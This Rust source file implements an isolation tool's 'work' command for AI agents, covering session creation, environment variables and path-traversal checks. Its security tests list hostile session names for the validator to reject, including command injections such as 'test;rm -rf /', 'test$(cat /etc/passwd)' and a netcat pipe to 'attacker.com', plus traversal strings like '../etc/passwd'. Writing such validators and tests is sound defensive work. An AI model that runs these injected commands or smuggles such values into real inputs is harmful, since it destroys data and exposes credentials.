//! work command - Unified workflow start for AI agents
//!
//! Combines multiple steps into one atomic operation:
//! 1. Create workspace (if not exists)
//! 2. Register as agent (optional)
//! 3. Set environment variables
//! 4. Output workspace info for agent to consume
//!
//! This is the AI-friendly entry point for starting work.

use std::path::Path;

use isolate_core::OutputFormat;
use serde::Serialize;

use crate::{
    commands::{
        abort::{check_in_jj_repo, detect_location, Location},
        add,
    },
    session::validate_session_name,
    IsolateError, Result,
};

/// Output for work command
#[derive(Debug, Clone, Serialize)]
pub struct WorkOutput {
    /// Session name
    pub name: String,
    /// Workspace path
    pub workspace_path: String,
    /// Whether this was a new session or existing
    pub created: bool,
    /// Agent ID if registered
    pub agent_id: Option<String>,
    /// Bead ID if specified
    pub bead_id: Option<String>,
    /// Environment variables set
    pub env_vars: Vec<EnvVar>,
    /// Shell command to enter workspace (for non-interactive use)
    pub enter_command: String,
}

/// Environment variable set by work command
#[derive(Debug, Clone, Serialize)]
pub struct EnvVar {
    pub name: String,
    pub value: String,
}

/// Options for work command
#[derive(Debug, Clone)]
#[allow(clippy::struct_excessive_bools)]
pub struct WorkOptions {
    /// Session name to create/use
    pub name: String,
    /// Bead ID to associate (optional)
    pub bead_id: Option<String>,
    /// Agent ID to register (optional, auto-generated if not provided)
    pub agent_id: Option<String>,
    /// Don't register as agent
    pub no_agent: bool,
    /// Idempotent mode - succeed if session already exists
    pub idempotent: bool,
    /// Dry run - don't actually create
    pub dry_run: bool,
    /// Output format
    pub format: OutputFormat,
}

/// Get isolate data directory
async fn isolate_data_dir() -> Result<std::path::PathBuf> {
    let home = std::env::var("HOME")
        .map_err(|e| IsolateError::OperationFailed(format!("HOME not set: {e}")))?;
    Ok(std::path::Path::new(&home).join(".isolate"))
}

/// Run the work command
///
/// # Errors
///
/// Returns an error if:
/// - Not in a JJ repo
/// - Session creation fails
/// - Already in a workspace (unless idempotent)
pub async fn run(options: &WorkOptions) -> Result<()> {
    validate_session_name(&options.name)?;

    let _root = check_in_jj_repo().await?;
    let location = detect_location(&_root)?;

    // Check if we're already in a workspace
    if let Location::Workspace { name, .. } = &location {
        if options.idempotent && name == &options.name {
            // Already in the target workspace - return success
            return output_existing_workspace(&_root, name, options).await;
        }
        return Err(IsolateError::OperationFailed(format!(
            "Already in workspace '{name}'. Use 'isolate done' to complete or 'isolate abort' to abandon."
        )));
    }

    // Dry run - just show what would happen
    if options.dry_run {
        return output_dry_run(options);
    }

    // Check if session already exists
    let session_db = crate::commands::bookmark::get_session_db().await?;

    let existing = session_db.get(&options.name).await?;

    if existing.is_some() {
        if options.idempotent {
            return output_existing_workspace(&_root, &options.name, options).await;
        }
        return Err(IsolateError::OperationFailed(format!(
            "Session '{}' already exists. Use --idempotent to reuse existing session.",
            options.name
        )));
    }

    // Create the session using add command infrastructure
    let add_options = add::types::AddOptions {
        name: options.name.clone(),
        bead_id: None,
        no_hooks: false,
        no_open: true,
        format: OutputFormat::Json, // We'll handle our own output
        idempotent: false,
        dry_run: false,
    };

    // Suppress add command output by running internally
    add::run_internal(&add_options)
        .await
        .map_err(|e| IsolateError::OperationFailed(e.to_string()))?;

    // Get data directory for workspace path
    let data_dir = isolate_data_dir().await?;

    // Generate agent ID if needed
    let agent_id = if options.no_agent {
        None
    } else {
        options
            .agent_id
            .clone()
            .or_else(|| Some(format!("agent-{}", generate_short_id())))
    };

    // Build output with path traversal protection
    let workspace_path = data_dir.join("workspaces").join(&options.name);
    verify_workspace_contained(&data_dir, &workspace_path)?;
    let output = WorkOutput {
        name: options.name.clone(),
        workspace_path: workspace_path.to_string_lossy().to_string(),
        created: true,
        agent_id: agent_id.clone(),
        bead_id: options.bead_id.clone(),
        env_vars: build_env_vars(
            &options.name,
            &workspace_path,
            agent_id.as_deref(),
            options.bead_id.as_deref(),
        ),
        enter_command: format!("cd {}", workspace_path.display()),
    };

    output_result(&output, options.format)
}

/// Output result for an existing workspace (idempotent mode)
async fn output_existing_workspace(_root: &Path, name: &str, options: &WorkOptions) -> Result<()> {
    let data_dir = isolate_data_dir().await?;
    let workspace_path = data_dir.join("workspaces").join(name);
    verify_workspace_contained(&data_dir, &workspace_path)?;

    let agent_id = if options.no_agent {
        None
    } else {
        options.agent_id.clone()
    };

    let output = WorkOutput {
        name: name.to_string(),
        workspace_path: workspace_path.to_string_lossy().to_string(),
        created: false,
        agent_id: agent_id.clone(),
        bead_id: options.bead_id.clone(),
        env_vars: build_env_vars(
            name,
            &workspace_path,
            agent_id.as_deref(),
            options.bead_id.as_deref(),
        ),
        enter_command: format!("cd {}", workspace_path.display()),
    };

    output_result(&output, options.format)
}

/// Output for dry run
fn output_dry_run(options: &WorkOptions) -> Result<()> {
    // Use a safe relative path for dry run (no actual filesystem access)
    let workspace_path = format!(".isolate/workspaces/{}", options.name);

    let agent_id = if options.no_agent {
        None
    } else {
        options
            .agent_id
            .clone()
            .or_else(|| Some(format!("agent-{}", generate_short_id())))
    };

    let output = WorkOutput {
        name: options.name.clone(),
        workspace_path: workspace_path.clone(),
        created: false,
        agent_id,
        bead_id: options.bead_id.clone(),
        env_vars: vec![
            EnvVar {
                name: "Isolate_SESSION".to_string(),
                value: options.name.clone(),
            },
            EnvVar {
                name: "Isolate_WORKSPACE".to_string(),
                value: workspace_path,
            },
        ],
        enter_command: format!("cd .isolate/workspaces/{}", options.name),
    };

    if options.format.is_json() {
        let envelope = serde_json::json!({
            "$schema": "isolate://work-response/v1",
            "_schema_version": "1.0",
            "schema_type": "single",
            "schema": "work-response",
            "type": "single",
            "data": output,
            "dry_run": true,
        });
        let json_str = serde_json::to_string_pretty(&envelope).map_err(|e| {
            IsolateError::OperationFailed(format!("Failed to serialize work dry-run output: {e}"))
        })?;
        println!("{json_str}");
    } else {
        println!("[DRY RUN] Would create session '{}'", options.name);
        println!("  Workspace: .isolate/workspaces/{}", options.name);
        if let Some(ref bead) = options.bead_id {
            println!("  Bead: {bead}");
        }
    }

    Ok(())
}

/// Build environment variables for the workspace
fn build_env_vars(
    name: &str,
    workspace_path: &Path,
    agent_id: Option<&str>,
    bead_id: Option<&str>,
) -> Vec<EnvVar> {
    let base_vars = vec![
        EnvVar {
            name: "Isolate_SESSION".to_string(),
            value: name.to_string(),
        },
        EnvVar {
            name: "Isolate_WORKSPACE".to_string(),
            value: workspace_path.to_string_lossy().to_string(),
        },
        EnvVar {
            name: "Isolate_ACTIVE".to_string(),
            value: "1".to_string(),
        },
    ];

    let agent_vars = agent_id
        .map(|agent| {
            vec![EnvVar {
                name: "Isolate_AGENT_ID".to_string(),
                value: agent.to_string(),
            }]
        })
        .into_iter()
        .flatten()
        .collect::<Vec<_>>();

    let bead_vars = bead_id
        .map(|bead| {
            vec![EnvVar {
                name: "Isolate_BEAD_ID".to_string(),
                value: bead.to_string(),
            }]
        })
        .into_iter()
        .flatten()
        .collect::<Vec<_>>();

    [base_vars, agent_vars, bead_vars]
        .into_iter()
        .flatten()
        .collect()
}

/// Output the result
fn output_result(output: &WorkOutput, format: OutputFormat) -> Result<()> {
    if format.is_json() {
        let envelope = serde_json::json!({
            "$schema": "isolate://work-response/v1",
            "_schema_version": "1.0",
            "schema_type": "single",
            "schema": "work-response",
            "type": "single",
            "data": output,
        });
        let json_str = serde_json::to_string_pretty(&envelope).map_err(|e| {
            IsolateError::OperationFailed(format!("Failed to serialize work output: {e}"))
        })?;
        println!("{json_str}");
    } else {
        if output.created {
            println!("Created session '{}'", output.name);
        } else {
            println!("Using existing session '{}'", output.name);
        }
        println!("  Workspace: {}", output.workspace_path);
        if let Some(ref agent) = output.agent_id {
            println!("  Agent: {agent}");
        }
        if let Some(ref bead) = output.bead_id {
            println!("  Bead: {bead}");
        }
        println!("\nTo enter workspace:");
        println!("  {}", output.enter_command);
    }

    Ok(())
}

/// Verify that `workspace_path` is contained within `data_dir`
///
/// This prevents path traversal attacks by canonicalizing both paths
/// and ensuring the workspace is a subdirectory of the data directory.
///
/// # Security
///
/// This function provides defense-in-depth by:
/// 1. Canonicalizing both paths to resolve any `".."` or symlinks
/// 2. Verifying the workspace path starts with the `data_dir` path
/// 3. Ensuring no escape from the intended directory structure
fn verify_workspace_contained(data_dir: &Path, workspace_path: &Path) -> Result<()> {
    // For path traversal security, we need to validate that the workspace_path
    // doesn't escape the data_dir, even if directories don't exist yet.

    // First, validate the session name (already done in work() but double-check here)
    // This is the primary defense - validate_session_name blocks path traversal chars

    // Second, check for ".." components in the workspace path
    for component in workspace_path.components() {
        if component == std::path::Component::ParentDir {
            return Err(IsolateError::OperationFailed(
                "Security error: Workspace path contains '..' component which may escape data directory"
                    .to_string(),
            ));
        }
    }

    // Third, verify the workspace path is within data_dir
    // We need to handle the case where neither directory exists yet
    let data_dir_absolute = if data_dir.is_absolute() {
        data_dir.to_path_buf()
    } else {
        std::env::current_dir()
            .map_err(|e| {
                IsolateError::OperationFailed(format!("Failed to get current directory: {e}"))
            })?
            .join(data_dir)
    };

    let workspace_absolute = if workspace_path.is_absolute() {
        workspace_path.to_path_buf()
    } else {
        std::env::current_dir()
            .map_err(|e| {
                IsolateError::OperationFailed(format!("Failed to get current directory: {e}"))
            })?
            .join(workspace_path)
    };

    // Check if workspace starts with data_dir (even if they don't exist)
    if !workspace_absolute.starts_with(&data_dir_absolute) {
        return Err(IsolateError::OperationFailed(
            "Security error: Workspace path escapes data directory. \
             This may indicate a path traversal attack or invalid configuration."
                .to_string(),
        ));
    }

    // If both exist, do additional canonicalization check for symlinks
    if data_dir.exists() && workspace_path.exists() {
        let canonical_data = data_dir.canonicalize().map_err(|e| {
            IsolateError::OperationFailed(format!("Failed to canonicalize data directory: {e}"))
        })?;

        let canonical_workspace = workspace_path.canonicalize().map_err(|e| {
            IsolateError::OperationFailed(format!("Failed to canonicalize workspace path: {e}"))
        })?;

        if !canonical_workspace.starts_with(&canonical_data) {
            return Err(IsolateError::OperationFailed(
                "Security error: Workspace path (after resolving symlinks) escapes data directory. \
                 This may indicate a path traversal attack or invalid configuration."
                    .to_string(),
            ));
        }
    }

    Ok(())
}

/// Generate a short random ID
#[allow(clippy::cast_possible_truncation)]
fn generate_short_id() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};

    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_or(0, |d| d.as_millis());

    // Use last 8 hex chars of timestamp + random suffix (truncation intentional)
    format!("{:08x}", timestamp as u32)
}

#[cfg(test)]
#[allow(
    clippy::cast_possible_truncation,
    clippy::unwrap_used,
    clippy::manual_unwrap_or_default,
    clippy::option_if_let_else,
    clippy::doc_markdown
)]
mod tests {
    use super::*;

    #[test]
    #[allow(clippy::cast_possible_truncation)]
    fn test_work_output_serializes() {
        let output = WorkOutput {
            name: "test-session".to_string(),
            workspace_path: "/path/to/.isolate/workspaces/test-session".to_string(),
            created: true,
            agent_id: Some("agent-12345".to_string()),
            bead_id: Some("isolate-abc12".to_string()),
            env_vars: vec![EnvVar {
                name: "Isolate_SESSION".to_string(),
                value: "test-session".to_string(),
            }],
            enter_command: "cd /path/to/.isolate/workspaces/test-session".to_string(),
        };

        let json = serde_json::to_string(&output);
        assert!(json.is_ok(), "serialization should succeed");
        let json_str = json.unwrap();
        assert!(json_str.contains("\"name\":\"test-session\""));
        assert!(json_str.contains("\"created\":true"));
    }

    #[test]
    fn test_build_env_vars() {
        let path = Path::new("/test/path");
        let vars = build_env_vars("test", path, Some("agent-1"), Some("bead-1"));

        assert!(vars.iter().any(|v| v.name == "Isolate_SESSION"));
        assert!(vars.iter().any(|v| v.name == "Isolate_WORKSPACE"));
        assert!(vars.iter().any(|v| v.name == "Isolate_AGENT_ID"));
        assert!(vars.iter().any(|v| v.name == "Isolate_BEAD_ID"));
    }

    #[test]
    fn test_generate_short_id() {
        let id1 = generate_short_id();
        let id2 = generate_short_id();

        // IDs should be 8 hex chars
        assert_eq!(id1.len(), 8);
        assert!(id1.chars().all(|c| c.is_ascii_hexdigit()));

        // Note: IDs might be the same if generated in same millisecond
        // This is acceptable for our use case
        let _ = id2; // Suppress unused warning
    }

    // ============================================================================
    // Behavior Tests
    // ============================================================================

    /// Test `WorkOptions` default values
    #[test]
    fn test_work_options_defaults() {
        let options = WorkOptions {
            name: "test-session".to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            idempotent: false,
            dry_run: false,
            format: isolate_core::OutputFormat::Json,
        };

        assert!(!options.no_agent);
        assert!(!options.idempotent);
        assert!(!options.dry_run);
    }

    /// Test `WorkOutput` created flag
    #[test]
    fn test_work_output_created_flag() {
        // New session
        let new_output = WorkOutput {
            name: "test".to_string(),
            workspace_path: "/path".to_string(),
            created: true,
            agent_id: None,
            bead_id: None,
            env_vars: vec![],
            enter_command: "cd /path".to_string(),
        };
        assert!(new_output.created);

        // Existing session (idempotent)
        let existing_output = WorkOutput {
            name: "test".to_string(),
            workspace_path: "/path".to_string(),
            created: false,
            agent_id: None,
            bead_id: None,
            env_vars: vec![],
            enter_command: "cd /path".to_string(),
        };
        assert!(!existing_output.created);
    }

    /// Test work output naming convention
    #[test]
    fn test_work_output_format() {
        let output = WorkOutput {
            name: "feature-auth".to_string(),
            workspace_path: "/path".to_string(),
            created: true,
            agent_id: None,
            bead_id: None,
            env_vars: vec![],
            enter_command: "cd /path".to_string(),
        };

        assert!(!output.name.is_empty());
        assert!(!output.workspace_path.is_empty());
    }

    /// Test `env_vars` contains required variables
    #[test]
    fn test_work_env_vars_required() {
        let path = Path::new("/test/workspace");
        let vars = build_env_vars("test-session", path, Some("agent-1"), Some("bead-1"));

        let var_names: Vec<_> = vars.iter().map(|v| v.name.as_str()).collect();

        assert!(var_names.contains(&"Isolate_SESSION"));
        assert!(var_names.contains(&"Isolate_WORKSPACE"));
        assert!(var_names.contains(&"Isolate_ACTIVE"));
        assert!(var_names.contains(&"Isolate_AGENT_ID"));
        assert!(var_names.contains(&"Isolate_BEAD_ID"));
    }

    /// Test `env_vars` without `agent_id`
    #[test]
    fn test_work_env_vars_no_agent() {
        let path = Path::new("/test/workspace");
        let vars = build_env_vars("test-session", path, None, None);

        let var_names: Vec<_> = vars.iter().map(|v| v.name.as_str()).collect();

        assert!(var_names.contains(&"Isolate_SESSION"));
        assert!(var_names.contains(&"Isolate_WORKSPACE"));
        assert!(var_names.contains(&"Isolate_ACTIVE"));
        assert!(!var_names.contains(&"Isolate_AGENT_ID"));
        assert!(!var_names.contains(&"Isolate_BEAD_ID"));
    }

    mod martin_fowler_work_env_matrix_behavior {
        use super::*;

        struct EnvCase {
            name: &'static str,
            agent: Option<&'static str>,
            bead: Option<&'static str>,
            expect_agent_var: bool,
            expect_bead_var: bool,
        }

        /// GIVEN: a matrix of agent/bead combinations
        /// WHEN: work environment variables are built
        /// THEN: optional environment variables should appear only when their inputs are provided
        #[test]
        fn given_agent_bead_matrix_when_building_env_vars_then_optional_vars_follow_inputs() {
            let cases = [
                EnvCase {
                    name: "no agent no bead",
                    agent: None,
                    bead: None,
                    expect_agent_var: false,
                    expect_bead_var: false,
                },
                EnvCase {
                    name: "agent only",
                    agent: Some("agent-1"),
                    bead: None,
                    expect_agent_var: true,
                    expect_bead_var: false,
                },
                EnvCase {
                    name: "bead only",
                    agent: None,
                    bead: Some("isolate-123"),
                    expect_agent_var: false,
                    expect_bead_var: true,
                },
                EnvCase {
                    name: "agent and bead",
                    agent: Some("agent-2"),
                    bead: Some("isolate-456"),
                    expect_agent_var: true,
                    expect_bead_var: true,
                },
            ];

            for case in cases {
                let vars = build_env_vars(
                    "session-x",
                    Path::new("/tmp/session-x"),
                    case.agent,
                    case.bead,
                );

                let has_agent = vars.iter().any(|v| v.name == "Isolate_AGENT_ID");
                let has_bead = vars.iter().any(|v| v.name == "Isolate_BEAD_ID");

                assert_eq!(
                    has_agent, case.expect_agent_var,
                    "case '{}' agent var mismatch",
                    case.name
                );
                assert_eq!(
                    has_bead, case.expect_bead_var,
                    "case '{}' bead var mismatch",
                    case.name
                );
            }
        }

        /// GIVEN: generated work environment variables
        /// WHEN: checking baseline variables
        /// THEN: core session variables should always be present
        #[test]
        fn given_work_env_vars_when_built_then_core_variables_are_always_present() {
            let vars = build_env_vars("session-core", Path::new("/tmp/session-core"), None, None);
            let names: Vec<&str> = vars.iter().map(|v| v.name.as_str()).collect();

            assert!(names.contains(&"Isolate_SESSION"));
            assert!(names.contains(&"Isolate_WORKSPACE"));
            assert!(names.contains(&"Isolate_ACTIVE"));
        }
    }

    /// Test `enter_command` format
    #[test]
    fn test_work_enter_command_format() {
        let output = WorkOutput {
            name: "test".to_string(),
            workspace_path: "/home/user/.isolate/workspaces/test".to_string(),
            created: true,
            agent_id: None,
            bead_id: None,
            env_vars: vec![],
            enter_command: "cd /home/user/.isolate/workspaces/test".to_string(),
        };

        assert!(output.enter_command.starts_with("cd "));
        assert!(output.enter_command.contains(&output.workspace_path));
    }

    /// Test `WorkOutput` JSON serialization includes all fields
    #[test]
    fn test_work_output_json_complete() {
        let output = WorkOutput {
            name: "test".to_string(),
            workspace_path: "/path".to_string(),
            created: true,
            agent_id: Some("agent-1".to_string()),
            bead_id: Some("bead-1".to_string()),
            env_vars: vec![EnvVar {
                name: "Isolate_SESSION".to_string(),
                value: "test".to_string(),
            }],
            enter_command: "cd /path".to_string(),
        };

        let json_str = match serde_json::to_string(&output) {
            Ok(s) => s,
            Err(_) => String::new(),
        };

        assert!(json_str.contains("name"));
        assert!(json_str.contains("workspace_path"));
        assert!(json_str.contains("created"));
        assert!(json_str.contains("agent_id"));
        assert!(json_str.contains("bead_id"));
        assert!(json_str.contains("env_vars"));
        assert!(json_str.contains("enter_command"));
    }

    /// Test idempotent mode reuses existing session
    #[test]
    fn test_work_idempotent_mode() {
        let options = WorkOptions {
            name: "existing".to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            idempotent: true,
            dry_run: false,
            format: isolate_core::OutputFormat::Json,
        };

        assert!(options.idempotent);
    }

    /// Test `dry_run` mode
    #[test]
    fn test_work_dry_run_mode() {
        let options = WorkOptions {
            name: "test".to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            idempotent: false,
            dry_run: true,
            format: isolate_core::OutputFormat::Json,
        };

        assert!(options.dry_run);
    }

    // ============================================================================
    // Security Tests - Path Traversal Protection
    // ============================================================================

    /// Test that session names with path separators are rejected
    #[test]
    fn test_work_rejects_path_separators() {
        let malicious_names = vec![
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/passwd",
            "\\windows\\system32",
            "./../../etc",
            ".\\..\\windows",
            "foo/../../etc",
            "foo\\..\\..\\windows",
        ];

        for name in malicious_names {
            let result = validate_session_name(name);
            assert!(
                result.is_err(),
                "Should reject path traversal attempt: {name}"
            );
        }
    }

    /// Test that null bytes are rejected
    #[test]
    fn test_work_rejects_null_bytes() {
        let result = validate_session_name("test\0name");
        assert!(result.is_err(), "Should reject names with null bytes");
    }

    /// Test that shell metacharacters are rejected
    #[test]
    fn test_work_rejects_shell_metacharacters() {
        let malicious_names = vec![
            "test;rm -rf /",
            "test$(cat /etc/passwd)",
            "test`whoami`",
            "test|nc attacker.com 4444",
            "test&& malicious",
            "test|| malicious",
            "test> /etc/passwd",
            "test< /etc/passwd",
            "test\nmalicious",
            "test\tmalicious",
            "test\rmalicious",
        ];

        for name in malicious_names {
            let result = validate_session_name(name);
            assert!(
                result.is_err(),
                "Should reject shell metacharacters: {name}"
            );
        }
    }

    /// Test that dots-only names are rejected
    #[test]
    fn test_work_rejects_dots_only() {
        let malicious_names = vec![".", "..", "...", "....", "....."];

        for name in malicious_names {
            let result = validate_session_name(name);
            assert!(result.is_err(), "Should reject dots-only names: {name}");
        }
    }

    /// Test that leading dots are rejected
    #[test]
    fn test_work_rejects_leading_dots() {
        let malicious_names = vec![".hidden", "..test", "...test", ".test", "..123", "...abc"];

        for name in malicious_names {
            let result = validate_session_name(name);
            assert!(
                result.is_err(),
                "Should reject names starting with dots: {name}"
            );
        }
    }

    /// Test that absolute path patterns are rejected
    #[test]
    fn test_work_rejects_absolute_path_patterns() {
        let malicious_names = vec![
            "C:\\Windows\\System32",
            "/usr/bin",
            "//server/share",
            "\\\\?\\C:\\",
            "C:/Windows",
        ];

        for name in malicious_names {
            let result = validate_session_name(name);
            assert!(
                result.is_err(),
                "Should reject absolute path patterns: {name}"
            );
        }
    }

    /// Test that URL-encoded path traversal is rejected
    #[test]
    fn test_work_rejects_url_encoded_traversal() {
        // Even if URL encoding bypasses other checks, % is not allowed
        let url_encoded = vec!["%2e%2e%2f", "..%2f", "%2e%2e%5c", "%252e%252e%252f"];

        for name in url_encoded {
            let result = validate_session_name(name);
            assert!(
                result.is_err(),
                "Should reject URL-encoded traversal: {name}"
            );
        }
    }

    /// Test that valid session names work correctly
    #[test]
    fn test_work_accepts_valid_names() {
        let valid_names = vec![
            "workspace",
            "my-workspace",
            "my_workspace",
            "workspace123",
            "MyWorkspace",
            "a",
            "FeatureBranch-123",
            "TEST-WORKSPACE",
            "test_workspace_123",
        ];

        for name in valid_names {
            let result = validate_session_name(name);
            assert!(result.is_ok(), "Should accept valid name: {name}");
        }
    }

    /// Test that path verification catches escapes
    #[tokio::test]
    async fn test_verify_workspace_contained_blocks_escape() {
        let temp_dir = std::env::temp_dir();
        let data_dir = temp_dir.join("isolate-test-data");
        let escaped_path = temp_dir.join("etc/passwd");

        let result = verify_workspace_contained(&data_dir, &escaped_path);
        assert!(
            result.is_err(),
            "Should block workspace paths escaping data directory"
        );
    }

    /// Test that path verification allows valid workspaces
    #[tokio::test]
    async fn test_verify_workspace_contained_allows_valid() {
        let temp_dir = std::env::temp_dir();
        let data_dir = temp_dir.join("isolate-test-data");
        let valid_workspace = data_dir.join("workspaces/test-session");

        std::fs::create_dir_all(&valid_workspace).ok();

        let result = verify_workspace_contained(&data_dir, &valid_workspace);
        assert!(
            result.is_ok(),
            "Should allow valid workspace paths within data directory"
        );

        std::fs::remove_dir_all(&data_dir).ok();
    }

    /// Test unicode bypass attempts are rejected
    #[test]
    fn test_work_rejects_unicode_lookalikes() {
        let lookalikes = vec![
            "\u{0430}dmin",
            "t\u{0435}st",
            "test\u{0301}",
            "\u{202e}test",
            "test\u{202e}name",
            "\u{200b}test",
            "test\u{200b}name",
        ];

        for name in lookalikes {
            let result = validate_session_name(name);
            assert!(
                result.is_err(),
                "Should reject unicode lookalike bypass: {name:?}"
            );
        }
    }

    /// Property test: validate_session_name is total (never panics)
    #[test]
    fn test_validate_session_name_never_panics() {
        let edge_cases: Vec<String> = vec![
            String::new(),
            "a".to_string(),
            "aa".to_string(),
            "a".repeat(64),
            "a".repeat(65),
            "\0".to_string(),
            "\n".to_string(),
            "\t".to_string(),
            "\r".to_string(),
            "\\".to_string(),
            "/".to_string(),
            "..".to_string(),
            "...".to_string(),
            ".".to_string(),
            "-".to_string(),
            "_".to_string(),
            "0".to_string(),
            "9".to_string(),
            "a\0b".to_string(),
            "a\nb".to_string(),
            "a\tb".to_string(),
            "a\\b".to_string(),
            "a/b".to_string(),
            "a..b".to_string(),
        ];

        for name in edge_cases {
            let _ = validate_session_name(&name);
        }
    }
}
